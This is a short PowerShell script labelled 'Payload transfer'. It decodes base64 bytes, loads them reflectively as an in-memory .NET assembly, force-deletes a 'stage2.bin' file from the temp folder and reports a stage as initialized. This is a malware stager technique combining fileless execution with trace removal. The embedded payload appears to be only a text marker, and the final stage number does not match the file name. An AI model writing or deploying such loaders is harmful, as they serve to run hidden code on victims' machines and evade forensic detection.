# Payload transfer
$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo3cGFxcm5iNm02")
Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length)
[Reflection.Assembly]::Load($AssemblyBytes)
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Output "stage 34 initialized"
